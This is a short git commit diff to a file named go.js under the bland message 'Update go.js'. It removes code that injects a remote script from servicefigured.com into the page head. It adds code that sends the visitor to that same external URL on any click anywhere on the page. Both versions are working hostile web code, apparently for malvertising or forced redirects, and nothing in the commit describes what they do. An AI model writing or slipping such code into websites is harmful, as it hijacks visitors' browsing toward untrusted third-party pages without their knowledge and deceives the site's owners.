ac3fdda92baf9f46c9247cfc11d9e6ace0078a58
Annabelle Beck <139564245+annabellabeck@users.noreply.github.com>
2024-10-21 12:52:24 +0700

    Update go.js

--- go.js
+++ go.js
@@ -1,8 +1,5 @@
-(function() {
-    var script = document.createElement('script');
-    script.type = 'text/javascript';
-    script.src = 'https://servicefigured.com/z1qnjfa9?key=e6f29ef20ab0f32eebc2dce099a43a89';
-    script.async = true;
-
-    document.head.appendChild(script);
-})();
+document.addEventListener('DOMContentLoaded', function() {
+    document.body.addEventListener('click', function() {
+        window.location.href = 'https://servicefigured.com/z1qnjfa9?key=e6f29ef20ab0f32eebc2dce099a43a89';
+    });
+});
